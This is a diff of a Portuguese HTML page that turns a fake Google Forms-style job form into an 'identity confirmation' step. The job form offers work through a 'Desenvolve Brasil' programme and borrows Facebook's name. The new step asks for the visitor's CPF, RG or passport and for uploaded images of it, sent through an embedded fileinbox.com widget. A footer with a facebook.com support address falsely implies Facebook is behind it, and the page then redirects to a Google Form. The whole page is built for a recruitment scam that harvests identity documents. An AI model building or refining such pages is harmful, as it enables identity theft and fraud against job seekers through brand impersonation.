@@ -4,20 +4,23 @@
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Prévia – Layout tipo Google Forms (corrigido)</title>
-  <meta name="description" content="Layout estático que imita o Google Forms, com imagem no topo. Não envia dados." />
-  <meta name="theme-color" content="#1d4ed8" />
+  <title>Pré‑seleção – Confirmação de Identidade</title>
+  <meta name="description" content="Página de pré‑seleção: confirme sua identidade e avance para o formulário." />
+  <meta name="theme-color" content="#0ea5e9" />
+  <!-- Open Graph -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Pré‑seleção – Confirmação de Identidade" />
+  <meta property="og:description" content="Escolha o tipo de documento, anexe seus arquivos e avance." />
+  <meta property="og:image" content="" />
+  <meta property="og:url" content="" />
   <style>
     :root{
       --bg1:#0ea5e9; /* sky-500 */
       --bg2:#1d4ed8; /* indigo-700 */
-      --accent:#1d4ed8; /* azul escuro padrão presell */
-      --accent-2:#1e40af;
-      --text:#202124; /* Google-ish */
-      --muted:#5f6368; /* cinza texto secundário */
-      --card:#fff;
-      --divider:#e0e0e0;
-      --error:#d93025;
+      --card:#ffffff;
+      --text:#0f172a; /* slate-900 */
+      --muted:#475569; /* slate-600 */
+      --ring:#93c5fd; /* blue-300 */
     }
     *{box-sizing:border-box}
     html,body{height:100%}
@@ -26,151 +29,133 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,Ubuntu,"Noto Sans",sans-serif;
       color:var(--text);
       background:linear-gradient(160deg,var(--bg1),var(--bg2)) fixed;
-      display:flex;justify-content:center;align-items:flex-start;min-height:100svh;
+      display:grid;
+      place-items:center;
       padding:clamp(12px,2vw,28px);
     }
-
-    .card{width:min(100%, 760px);background:var(--card);border-radius:12px;box-shadow:0 10px 30px rgba(2,6,23,.20);overflow:hidden;border:1px solid rgba(0,0,0,.06)}
-    .header{background:linear-gradient(135deg,var(--accent),var(--accent-2));padding:28px}
-    .hero{margin:0 0 16px}
-    .hero img{width:100%;height:auto;max-height:420px;object-fit:cover;border-radius:10px;display:block;box-shadow:0 4px 18px rgba(0,0,0,.12)}
-    .title{margin:0;color:#fff;font-weight:800;line-height:1.15;font-size:clamp(22px,4.2vw,32px)}
-    .desc{margin:10px 0 0;color:#e8f0fe;font-weight:500}
-
-    .preview-badge{display:flex;gap:8px;align-items:center;background:#dbeafe;color:#1e3a8a;border:1px solid #bfdbfe;padding:10px 12px;border-radius:10px;margin-top:12px;font-size:13px}
-
-    .section{padding:22px 26px;border-top:8px solid var(--accent);} 
-    .section h2{margin:0 0 8px;font-size:20px}
-    .section p{margin:0;color:var(--muted)}
-
-    .q{padding:18px 26px;border-top:1px solid var(--divider)}
-    .q:first-of-type{border-top:0}
-    .q .label{font-weight:600;margin:0 0 8px}
-    .q .req{color:var(--error);margin-left:6px}
-    .q small{display:block;color:var(--muted);margin-top:6px}
-
-    input[type="text"], input[type="email"], textarea, select, input[type="date"], input[type="time"]{
-      width:100%;border:1px solid #dadce0;border-radius:4px;padding:12px 14px;font-size:15px;background:#fff
+    .card{
+      width:min(100%, 980px);
+      background:var(--card);
+      border-radius:20px;
+      box-shadow:0 10px 30px rgba(2,6,23,.25);
+      overflow:hidden;
+      border:1px solid rgba(15,23,42,.06);
+      animation:pop .35s ease;
     }
-    textarea{min-height:110px;resize:vertical}
+    @keyframes pop{from{transform:translateY(8px);opacity:.0}to{transform:translateY(0);opacity:1}}
 
-    .choice{display:flex;align-items:center;gap:10px;margin:8px 0}
-    .choice input{accent-color:var(--accent)}
+    .header{
+      background:linear-gradient(135deg, #38bdf8, #2563eb);
+      color:white;
+      padding:32px 28px 24px;
+    }
+    .tag{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:.2px}
+    .title{margin:12px 0 6px;font-weight:800;line-height:1.1;font-size: clamp(22px, 4.5vw, 34px)}
+    .subtitle{margin:0;opacity:.95;font-weight:500}
 
-    .actions{padding:22px 26px;border-top:1px solid var(--divider);display:flex;justify-content:flex-end}
-    .btn{appearance:none;border:0;background:var(--accent);color:#fff;border-radius:8px;padding:12px 18px;font-weight:800;font-size:15px;cursor:pointer}
+    .content{padding:22px 22px 26px}
+
+    .section{border:1px solid rgba(15,23,42,.08);border-radius:14px;background:#f8fafc;padding:22px;box-shadow:0 6px 20px rgba(2,6,23,.10);margin-bottom:18px}
+    .section h3{margin:0 0 12px;font-size:18px}
+
+    .radios{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
+    .radio{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid rgba(15,23,42,.10);border-radius:12px;background:#fff;cursor:pointer}
+    .radio input{accent-color:#2563eb;width:18px;height:18px}
+
+    .filebox{padding:14px;background:#fff;border:1px dashed rgba(15,23,42,.18);border-radius:12px}
+
+    .actions{display:flex;justify-content:flex-end}
+    .btn{appearance:none;border:0;cursor:pointer;background:#1d4ed8;color:#fff;border-radius:12px;padding:12px 18px;font-weight:800;font-size:16px;display:inline-flex;align-items:center;gap:8px}
     .btn:hover{filter:brightness(1.05)}
-    .btn:focus-visible{outline:3px solid #93c5fd;outline-offset:2px}
+    .btn:focus-visible{outline:3px solid var(--ring);outline-offset:2px}
+
+    .error{color:#b91c1c;font-size:13px;margin-top:10px;display:none}
+
+    .footer{padding:16px 22px 24px;color:var(--muted);font-size:12px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+    .footer a{color:#2563eb;text-underline-offset:3px}
 
     @media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important}}
   </style>
 </head>
-<body>
-  <form class="card" id="mockForm" novalidate>
-    <!-- Cabeçalho com IMAGEM no topo -->
-    <div class="header">
-      <div class="hero" aria-hidden="true">
-        <img src="https://lh7-rt.googleusercontent.com/formsz/AN7BsVD-xQEcawZWwgxGOocPjoKOPEXqo-lRtDbSSaaQ5C6vQLHmrFP3Cgugr8-LQTuZ5ypEha96QcOhIvOfkglRolWXb-LNvxQIkraYCXiUEtK9qqkXgOGZkCtev3mrG8-y4G9ucS1n5fF4wlk89PhQwkNXMF0gCCsAUNlxRQ?key=8F8rkgW2AJQLZA6lGMoytw" alt="Foto do escritório do Facebook" />
+<body data-next="https://docs.google.com/forms/d/e/1FAIpQLScPtyQmrCQJb0lSx0aOOf4HXtCaFUjPLeOXEhMZRmNJ-T2YaA/viewform?usp=header">
+  <main class="card" role="main" aria-labelledby="t">
+    <header class="header">
+      <span class="tag" aria-label="etiqueta">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/><path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/></svg>
+        Verificação
+      </span>
+      <h1 class="title">Perfeito, agora confirme sua identidade</h1>
+      <p class="subtitle">Responda abaixo para avançar ao formulário oficial.</p>
+    </header>
+
+    <section class="content">
+      <div class="section" role="group" aria-labelledby="doclabel">
+        <h3 id="doclabel">Tipo de documento</h3>
+        <div class="radios">
+          <label class="radio" for="doc_cpf"><input id="doc_cpf" name="doctype" type="radio" value="CPF" /> CPF</label>
+          <label class="radio" for="doc_rg"><input id="doc_rg" name="doctype" type="radio" value="RG" /> RG</label>
+          <label class="radio" for="doc_pass"><input id="doc_pass" name="doctype" type="radio" value="PASSAPORTE" /> Passaporte</label>
+        </div>
+        <div id="err" class="error">Selecione um tipo de documento para continuar.</div>
       </div>
-      <h1 class="title">Agora você pode trabalhar conosco</h1>
-      <p class="desc">Através do programa Desenvolve Brasil, nós iremos te capacitar! (Mesmo que você não tenha experiência)</p>
-      <div class="preview-badge" aria-live="polite">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M12 3c4.97 0 9 4.03 9 9s-4.03 9-9 9a9 9 0 1 1 0-18Zm0 4a5 5 0 1 0 .001 10.001A5 5 0 0 0 12 7Z" fill="currentColor"/></svg>
-        Últimas vagas disponíveis.
+
+      <div class="section" role="group" aria-labelledby="timelabel">
+        <h3 id="timelabel">Melhor horário para contato</h3>
+        <div class="radios">
+          <label class="radio" for="hr_manha"><input id="hr_manha" name="besttime" type="radio" value="Manhã" /> Manhã</label>
+          <label class="radio" for="hr_tarde"><input id="hr_tarde" name="besttime" type="radio" value="Tarde" /> Tarde</label>
+          <label class="radio" for="hr_noite"><input id="hr_noite" name="besttime" type="radio" value="Noite" /> Noite</label>
+        </div>
       </div>
-    </div>
 
-    <!-- Seção 1 -->
-    <div class="section">
-      <h2>Seção 1</h2>
-      <p>Informações básicas</p>
-    </div>
+      <div class="section">
+        <h3>Envie as imagens do documento</h3>
+        <div class="filebox">
+          <!-- EMBED Fileinbox: usa o serviço externo, sem salvar nada localmente -->
+          <a href="https://fileinbox.com/enviodeinformacoes" class="fileinbox">Send files with fileinbox.com</a>
+          <script type="text/javascript" src="https://fileinbox.com/embed.js"></script>
+        </div>
+      </div>
 
-    <div class="q">
-      <p class="label">Nome completo<span class="req">*</span></p>
-      <input type="text" placeholder="Digite seu nome" aria-required="true" required />
-    </div>
+      <div class="actions">
+        <button id="send" class="btn" type="button" aria-label="Enviar e avançar">Enviar</button>
+      </div>
+    </section>
 
-    <div class="q">
-      <p class="label">E‑mail<span class="req">*</span></p>
-      <input type="email" placeholder="voce@exemplo.com" aria-required="true" required />
-      <small>Usado para contato durante o processo.</small>
-    </div>
-
-    <div class="q">
-      <p class="label">Fale brevemente sobre você</p>
-      <textarea placeholder="Escreva aqui..."></textarea>
-    </div>
-
-    <!-- Múltipla escolha -->
-    <div class="q">
-      <p class="label">Você tem 7 horas por dia disponíveis para Home Office?<span class="req">*</span></p>
-      <label class="choice"><input type="radio" name="q1" required /> Sim</label>
-      <label class="choice"><input type="radio" name="q1" /> Não</label>
-    </div>
-
-    <!-- Pergunta adicionada -->
-    <div class="q">
-      <p class="label">Poderia frequentar as nossas reuniões anuais do Facebook em São Paulo com tudo pago, incluindo passagem e hospedagem pela nossa empresa para fins de treinamento e aperfeiçoamento?<span class="req">*</span></p>
-      <label class="choice"><input type="radio" name="q2" required /> Sim</label>
-      <label class="choice"><input type="radio" name="q2" /> Não</label>
-    </div>
-
-    <!-- Caixa de seleção -->
-    <div class="q">
-      <p class="label">Quais áreas você tem interesse?</p>
-      <label class="choice"><input type="checkbox" /> Comercial</label>
-      <label class="choice"><input type="checkbox" /> Suporte</label>
-      <label class="choice"><input type="checkbox" /> Marketing</label>
-      <label class="choice"><input type="checkbox" /> Operações</label>
-    </div>
-
-    <!-- Dropdown -->
-    <div class="q">
-      <p class="label">Disponibilidade de início</p>
-      <select>
-        <option>Imediata</option>
-        <option>Em 7 dias</option>
-        <option>Em 15 dias</option>
-        <option>Em 30 dias</option>
-      </select>
-    </div>
-
-    <!-- Data / Hora -->
-    <div class="q">
-      <p class="label">Data de nascimento</p>
-      <input type="date" />
-    </div>
-    <div class="q">
-      <p class="label">Melhor horário para contato</p>
-      <input type="time" />
-    </div>
-
-    <!-- Ações -->
-    <div class="actions">
-      <button class="btn" type="submit">Enviar</button>
-    </div>
-  </form>
+    <footer class="footer">
+      <span>🔒 Seus dados serão usados apenas para esta seleção.</span>
+      <span>Suporte: <a href="mailto:trabalheconosco@facebook.com">trabalheconosco@facebook.com</a></span>
+    </footer>
+  </main>
 
   <script>
     (function(){
-      const form = document.getElementById('mockForm');
-      const NEXT = 'https://presellemp.vercel.app/pagina2.html';
+      const nextBase = document.body.getAttribute('data-next');
+      const btn = document.getElementById('send');
+      const err = document.getElementById('err');
 
-      form.addEventListener('submit', function(ev){
-        ev.preventDefault();
-        if(!form.checkValidity()){
-          form.reportValidity();
-          return; // não redireciona se inválido
+      function getDocType(){
+        const el = document.querySelector('input[name="doctype"]:checked');
+        return el ? el.value : null;
+      }
+
+      btn.addEventListener('click', function(){
+        const type = getDocType();
+        if(!type){
+          err.style.display = 'block';
+          return;
         }
         try{
-          const url = new URL(NEXT);
-          // Repasse UTMs da URL atual, se existirem
-          const params = new URLSearchParams(window.location.search);
-          params.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
-          window.location.assign(url.toString());
+          const url = new URL(nextBase);
+          // repassar UTMs e anexar doc_type + besttime (se houver)
+          const paramsHere = new URLSearchParams(window.location.search);
+          paramsHere.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
+          url.searchParams.set('doc_type', type);
+          const best = document.querySelector('input[name="besttime"]:checked');
+          if(best) url.searchParams.set('best_time', best.value);
+          window.location.assign(url.toString()); // mesma aba
         }catch(e){
-          window.location.assign(NEXT);
+          window.location.assign(nextBase);
         }
       });
     })();
